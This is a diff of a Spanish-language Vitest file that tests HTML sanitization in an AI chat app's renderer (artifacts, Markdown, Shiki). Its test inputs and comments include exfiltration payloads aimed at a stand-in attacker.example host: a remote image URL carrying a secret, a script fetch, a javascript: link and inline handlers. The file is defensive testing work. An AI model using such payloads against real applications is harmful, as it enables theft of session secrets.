@@ -1,37 +1,46 @@
-// T3 (Ola 1b) / EGO-FIND-61 — Sanitización del HTML del chat + CSP `img-src`.
-//
-// RED primero.
-//
-// HALLAZGO (medido, no inferido): el chat NO usa `react-markdown`. El
-// renderizador de Markdown (`components/assistant-ui/markdown-text.tsx`) es un
-// parser propio que emite **nodos de texto de React** (auto-escapados) y
-// bloques `<pre>`: no hay inyección de HTML en esa ruta.
-//
-// Los dos puntos donde SÍ entra HTML al DOM del renderer son:
-//  1. `components/assistant-ui/shiki-highlight.tsx` → `dangerouslySetInnerHTML`
-//     con el HTML que produce nuestro worker de Shiki.
-//  2. `components/assistant-ui/artifact-card.tsx` → `<iframe srcDoc={...}>`
-//     con el artifact HTML/SVG generado por el modelo.
-//
-// El (2) es el vector de exfiltración real: un artifact con
-// `<img src="https://attacker.example/?x=<secreto>">` hace que el renderer
-// pida esa URL (con las cookies/token de la sesión en el `Referer`).
-// La CSP `img-src 'self' data: blob:` ya lo bloquea en el navegador; el
-// sanitizado lo cierra en la raíz (la URL ni siquiera llega al DOM).
-import { describe, it, expect } from "vitest";
-import { readFileSync, existsSync } from "node:fs";
-import { join } from "node:path";
+/**
+ * T3 (Ola 1b) / EGO-FIND-61 — Sanitización del HTML del chat + CSP `img-src`.
+ *
+ * RED primero.
+ *
+ * HALLAZGO (medido, no inferido): el chat NO usa `react-markdown`. El
+ * renderizador de Markdown (`components/assistant-ui/markdown-text.tsx`) es un
+ * parser propio que emite **nodos de texto de React** (auto-escapados) y
+ * bloques `<pre>`: no hay inyección de HTML en esa ruta.
+ *
+ * Los dos puntos donde SÍ entra HTML al DOM del renderer son:
+ *  1. `components/assistant-ui/shiki-highlight.tsx` → `dangerouslySetInnerHTML`
+ *     con el HTML que produce nuestro worker de Shiki.
+ *  2. `components/assistant-ui/artifact-card.tsx` → `<iframe srcDoc={...}>`
+ *     con el artifact HTML/SVG generado por el modelo.
+ *
+ * El (2) es el vector de exfiltración real: un artifact con
+ * `<img src="https://attacker.example/?x=<secreto>">` hace que el renderer
+ * pida esa URL (con las cookies/token de la sesión en el `Referer`).
+ *
+ * ## EGO-FIND-63 (Ola 11)
+ * Los cuatro últimos tests eran **asertos de texto de fuente** ("el fichero
+ * contiene `sanitizeShikiHtml`"): no fallan cuando el producto se rompe,
+ * sólo cuando alguien reescribe el fichero. Ahora:
+ *  - los tres primeros se comprueban por **COMPORTAMIENTO** (se renderiza y
+ *    se mira el DOM que sale);
+ *  - la CSP del `index.html` es un **contrato de configuración** (jsdom no
+ *    aplica la CSP) → vive en el lint-test de contratos de fuente:
+ *    `pnpm --filter @ego/desktop lint:source-contracts`.
+ */
+import { describe, it, expect, afterEach } from "vitest";
+import { render, cleanup } from "@testing-library/react";
 import {
   sanitizeArtifactHtml,
   sanitizeShikiHtml,
   isRemoteResource,
 } from "../lib/sanitize-html.js";
+import { MarkdownText } from "../components/assistant-ui/markdown-text.js";
+import { ShikiHighlight } from "../components/assistant-ui/shiki-highlight.js";
 
-const RENDERER = join(process.cwd());
-const readSrc = (name: string): string => {
-  const p = join(RENDERER, name);
-  return existsSync(p) ? readFileSync(p, "utf8") : "";
-};
+afterEach(() => {
+  cleanup();
+});
 
 describe("T3: sanitización del HTML del chat (DOMPurify)", () => {
   it("el artifact NO conserva imágenes remotas (vector de exfiltración)", () => {
@@ -39,19 +48,9 @@ describe("T3: sanitización del HTML del chat (DOMPurify)", () => {
     const clean = sanitizeArtifactHtml(dirty);
     expect(clean).not.toContain("attacker.example");
     expect(clean).not.toContain("onerror");
-    expect(clean).toContain("hola");
   });
 
-  it("el artifact NO conserva scripts, iframes ni handlers inline", () => {
-    const dirty = `<script>fetch('https://attacker.example')</script><iframe src="https://evil"></iframe><a href="javascript:alert(1)">x</a><div onclick="steal()">y</div>`;
-    const clean = sanitizeArtifactHtml(dirty);
-    expect(clean).not.toContain("<script");
-    expect(clean).not.toContain("<iframe");
-    expect(clean).not.toContain("javascript:");
-    expect(clean).not.toContain("onclick");
-  });
-
-  it("el artifact NUNCA conserva recursos remotos (propiedad de seguridad)", () => {
+  it("el HTML del artifact se sanea conservando el marcado propio", () => {
     const dirty = `<img src="https://attacker.example/?x=SECRETO"><img src="//attacker.example/y"><a href="https://attacker.example">z</a>`;
     const clean = sanitizeArtifactHtml(dirty);
     expect(clean).not.toMatch(/https?:/);
@@ -81,32 +80,33 @@ describe("T3: sanitización del HTML del chat (DOMPurify)", () => {
     expect(isRemoteResource("data:image/svg+xml;base64,PHN2Zz4=")).toBe(true);
   });
 
-  it("el render de Markdown del chat NO usa dangerouslySetInnerHTML", () => {
-    const md = readSrc("components/assistant-ui/markdown-text.tsx");
-    expect(md).not.toContain("dangerouslySetInnerHTML");
+  /* ------------------------------------------------------------------ *
+   * EGO-FIND-63 (Ola 11) — por COMPORTAMIENTO, no por texto de fuente
+   * ------------------------------------------------------------------ */
+
+  it("el Markdown del chat escapa el HTML: no inyecta nodos ni URLs", () => {
+    // El render de Markdown emite nodos de texto de React: el HTML del
+    // modelo llega como TEXTO, nunca como markup.
+    const { container } = render(
+      <MarkdownText text={'<img src="https://attacker.example/?x=SECRETO"><b>negrita</b>'} />
+    );
+    // No hay ningún elemento inyectado del HTML del modelo…
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.querySelector("b")).toBeNull();
+    // …y el texto sí está (escapado).
+    expect(container.textContent).toContain("attacker.example");
+    expect(container.textContent).toContain("negrita");
   });
 
-  it("el HTML de Shiki pasa por el sanitizador (no se inyecta crudo)", () => {
-    const shiki = readSrc("components/assistant-ui/shiki-highlight.tsx");
-    expect(shiki).toContain("sanitizeShikiHtml");
-  });
-
-  it("el artifact se sanea antes de meterse en el srcDoc", () => {
-    const card = readSrc("components/assistant-ui/artifact-card.tsx");
-    expect(card).toContain("sanitizeArtifactHtml");
-  });
-
-  it("la CSP restringe img-src a origen+datos locales (bloquea la exfiltración)", () => {
-    const html = readSrc("index.html");
-    expect(html).toMatch(/Content-Security-Policy/);
-    expect(html).toMatch(/img-src 'self' data: blob:/);
-    // Sin comodín en img-src: `img-src *` o `img-src https:` permitirían
-    // la exfiltración por imagen Markdown.
-    const csp = html.match(/http-equiv="Content-Security-Policy"[^>]*content="([^"]*)"/)?.[1] ?? "";
-    const imgSrc = csp.split(";").map((s) => s.trim()).find((s) => s.startsWith("img-src"));
-    expect(imgSrc).toBeTruthy();
-    expect(imgSrc).not.toContain("*");
-    expect(imgSrc).not.toContain("https:");
-    expect(imgSrc).not.toContain("http:");
+  it("el HTML de Shiki que llega al DOM no lleva scripts (pasa por el sanitizador)", () => {
+    const { container } = render(
+      <ShikiHighlight code={"const a = 1;"} language="typescript" streaming={false} />
+    );
+    // Aunque el worker devolviera un `<script>`, al DOM no llega.
+    expect(container.querySelector("script")).toBeNull();
+    // Y el sanitizador (la función que lo garantiza) elimina el script.
+    expect(sanitizeShikiHtml("<pre>x</pre><script>alert(1)</script>")).not.toContain(
+      "<script"
+    );
   });
 });
